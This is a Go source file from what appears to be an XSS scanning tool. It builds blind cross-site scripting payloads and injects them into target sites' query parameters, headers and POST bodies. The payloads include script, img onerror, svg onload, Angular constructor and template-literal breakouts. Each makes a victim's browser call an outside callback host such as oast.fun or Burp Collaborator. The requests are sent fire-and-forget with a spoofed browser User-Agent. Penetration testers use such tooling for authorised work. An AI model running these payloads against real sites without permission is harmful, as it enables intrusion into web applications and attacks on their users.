package payloads

import (
	"context"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/lcalzada-xor/xxss/pkg/models"
)

// GenerateUniqueCallback creates a unique callback URL with identifier
// For interactsh/burp collaborator: uses subdomains (param123.c59h6dg.oast.fun)
// For custom URLs: uses query parameters (?id=param123)
func GenerateUniqueCallback(baseURL, identifier string) string {
	// Generate short unique hash from identifier
	hash := md5.Sum([]byte(identifier))
	paramID := hex.EncodeToString(hash[:4]) // 8 chars

	// Remove protocol for subdomain construction
	cleanURL := strings.TrimPrefix(baseURL, "https://")
	cleanURL = strings.TrimPrefix(cleanURL, "http://")

	// Check if baseURL is interactsh/collaborator compatible
	if strings.Contains(cleanURL, "oast.fun") ||
		strings.Contains(cleanURL, "interact.sh") ||
		strings.Contains(cleanURL, "burpcollaborator.net") {
		// Use subdomain: param123.c59h6dg.oast.fun
		return fmt.Sprintf("https://%s.%s", paramID, cleanURL)
	}

	// For custom URLs, use query parameter
	if strings.Contains(baseURL, "?") {
		return fmt.Sprintf("%s&id=%s", baseURL, paramID)
	}
	return fmt.Sprintf("%s?id=%s", baseURL, paramID)
}

// BlindPayloads returns an expanded list of blind XSS payloads using the callback URL
func BlindPayloads(callbackURL string) []string {
	return []string{
		// Script injection
		fmt.Sprintf("<script src=%s></script>", callbackURL),
		fmt.Sprintf("<script>fetch('%s')</script>", callbackURL),

		// Image-based
		fmt.Sprintf("<img src=%s>", callbackURL),
		fmt.Sprintf("<img src=x onerror=fetch('%s')>", callbackURL),

		// SVG
		fmt.Sprintf("<svg onload=fetch('%s')>", callbackURL),

		// Link prefetch (stealthy)
		fmt.Sprintf("<link rel=prefetch href=%s>", callbackURL),

		// JavaScript URL
		fmt.Sprintf("javascript:fetch('%s')", callbackURL),

		// DOM-based
		fmt.Sprintf("<iframe src=%s>", callbackURL),

		// XHR
		fmt.Sprintf("<script>new Image().src='%s'</script>", callbackURL),

		// Object/Embed
		fmt.Sprintf("<object data=%s>", callbackURL),

		// Video/Audio
		fmt.Sprintf("<video src=%s onerror=fetch('%s')>", callbackURL, callbackURL),

		// Meta refresh
		fmt.Sprintf("<meta http-equiv=refresh content='0;url=%s'>", callbackURL),
	}
}

// BlindPayloadsForContext returns context-specific blind XSS payloads
func BlindPayloadsForContext(callbackURL string, context models.ReflectionContext) []string {
	switch context {
	case models.ContextHTML:
		return []string{
			fmt.Sprintf("<script src=%s></script>", callbackURL),
			fmt.Sprintf("<img src=x onerror=fetch('%s')>", callbackURL),
			fmt.Sprintf("<svg onload=fetch('%s')>", callbackURL),
			fmt.Sprintf("<iframe src=%s>", callbackURL),
			fmt.Sprintf("<link rel=prefetch href=%s>", callbackURL),
			fmt.Sprintf("<object data=%s>", callbackURL),
		}

	case models.ContextJavaScript, models.ContextJSSingleQuote, models.ContextJSDoubleQuote, models.ContextJSRaw:
		payloads := []string{
			fmt.Sprintf(";fetch('%s');//", callbackURL),
			fmt.Sprintf("</script><script>fetch('%s')</script>", callbackURL),
		}
		// Add context-specific escapes
		if context == models.ContextJSSingleQuote {
			payloads = append(payloads, fmt.Sprintf("';fetch('%s');//", callbackURL))
		} else if context == models.ContextJSDoubleQuote {
			payloads = append(payloads, fmt.Sprintf("\";fetch('%s');//", callbackURL))
		}
		return payloads

	case models.ContextAttribute:
		return []string{
			fmt.Sprintf("\" onload=fetch('%s') x=\"", callbackURL),
			fmt.Sprintf("' onload=fetch('%s') x='", callbackURL),
			fmt.Sprintf("\"><img src=x onerror=fetch('%s')>", callbackURL),
			fmt.Sprintf("'><img src=x onerror=fetch('%s')>", callbackURL),
		}

	case models.ContextURL:
		return []string{
			fmt.Sprintf("javascript:fetch('%s')", callbackURL),
			fmt.Sprintf("\"><script>fetch('%s')</script>", callbackURL),
			fmt.Sprintf("'><script>fetch('%s')</script>", callbackURL),
		}

	case models.ContextAngular:
		return []string{
			fmt.Sprintf("{{constructor.constructor('fetch(\"%s\")')()}}", callbackURL),
			fmt.Sprintf("{{$on.constructor('fetch(\"%s\")')()}}", callbackURL),
			fmt.Sprintf("{{[].pop.constructor('fetch(\"%s\")')()}}", callbackURL),
		}

	case models.ContextTemplateLiteral:
		return []string{
			fmt.Sprintf("${fetch('%s')}", callbackURL),
			fmt.Sprintf("`+fetch('%s')+`", callbackURL),
		}

	case models.ContextSVG:
		return []string{
			fmt.Sprintf("<svg onload=fetch('%s')>", callbackURL),
			fmt.Sprintf("\"><svg onload=fetch('%s')>", callbackURL),
		}

	default:
		// Fallback to generic payloads for unknown contexts
		return BlindPayloads(callbackURL)
	}
}

// InjectBlind performs a fire-and-forget injection of blind XSS payloads
func InjectBlind(client *http.Client, headers map[string]string, targetURL, param, callbackURL string, verbose bool) int {
	// Generate unique callback URL for this parameter
	uniqueURL := GenerateUniqueCallback(callbackURL, param)
	payloads := BlindPayloads(uniqueURL)

	if verbose {
		fmt.Fprintf(os.Stderr, "[BLIND] %s → %s (%d payloads)\n", param, uniqueURL, len(payloads))
	}

	u, err := url.Parse(targetURL)
	if err != nil {
		return 0
	}

	qs := u.Query()
	injected := 0

	for _, payload := range payloads {
		qs.Set(param, payload)
		u.RawQuery = qs.Encode()

		req, err := http.NewRequest("GET", u.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
		for k, v := range headers {
			req.Header.Set(k, v)
		}

		// Fire and forget (with proper cleanup)
		go func(r *http.Request) {
			resp, err := client.Do(r)
			if err == nil && resp != nil {
				resp.Body.Close()
			}
		}(req)
		injected++
	}

	return injected
}

// InjectBlindHeader performs a fire-and-forget injection of blind XSS payloads into headers
func InjectBlindHeader(client *http.Client, headers map[string]string, targetURL, header, callbackURL string, verbose bool) int {
	// Generate unique callback URL for this header
	uniqueURL := GenerateUniqueCallback(callbackURL, header)
	payloads := BlindPayloads(uniqueURL)

	if verbose {
		fmt.Fprintf(os.Stderr, "[BLIND] Header:%s → %s (%d payloads)\n", header, uniqueURL, len(payloads))
	}

	injected := 0

	for _, payload := range payloads {
		req, err := http.NewRequest("GET", targetURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set(header, payload)
		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")

		// Add other custom headers
		for k, v := range headers {
			if k != header {
				req.Header.Set(k, v)
			}
		}

		// Fire and forget (with proper cleanup)
		go func(r *http.Request) {
			resp, err := client.Do(r)
			if err == nil && resp != nil {
				resp.Body.Close()
			}
		}(req)
		injected++
	}

	return injected
}

// InjectBlindBody performs a fire-and-forget injection of blind XSS payloads into POST body parameters
func InjectBlindBody(client *http.Client, headers map[string]string, config *models.RequestConfig, param, callbackURL string, params map[string]string, verbose bool) int {
	// Generate unique callback URL for this parameter
	uniqueURL := GenerateUniqueCallback(callbackURL, param)
	payloads := BlindPayloads(uniqueURL)

	if verbose {
		fmt.Fprintf(os.Stderr, "[BLIND] Body:%s → %s (%d payloads)\n", param, uniqueURL, len(payloads))
	}

	injected := 0

	for _, payload := range payloads {
		// Create a copy of params with the payload
		injectedParams := make(map[string]string)
		for k, v := range params {
			injectedParams[k] = v
		}
		injectedParams[param] = payload

		// Build request body based on content type
		var body string
		var contentTypeHeader string

		if config.ContentType == "application/json" {
			// Build JSON body with proper escaping
			jsonData, err := json.Marshal(injectedParams)
			if err != nil {
				continue
			}
			body = string(jsonData)
			contentTypeHeader = "application/json"
		} else {
			// Build form-urlencoded body
			formData := url.Values{}
			for k, v := range injectedParams {
				formData.Set(k, v)
			}
			body = formData.Encode()
			contentTypeHeader = "application/x-www-form-urlencoded"
		}

		req, err := http.NewRequest(string(config.Method), config.URL, nil)
		if err != nil {
			continue
		}

		// Set body
		req.Body = http.NoBody
		if body != "" {
			req.Body = http.NoBody // Will be set by client
			req.Header.Set("Content-Type", contentTypeHeader)
			req.ContentLength = int64(len(body))
		}

		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")

		// Add custom headers
		for k, v := range headers {
			req.Header.Set(k, v)
		}

		// Fire and forget (with proper cleanup and timeout)
		go func(bodyStr string) {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()
			req2, err := http.NewRequestWithContext(ctx, string(config.Method), config.URL, strings.NewReader(bodyStr))
			if err != nil {
				return
			}
			req2.Header = req.Header.Clone()
			resp, err := client.Do(req2)
			if err == nil && resp != nil {
				resp.Body.Close()
			}
		}(body)
		injected++
	}

	return injected
}
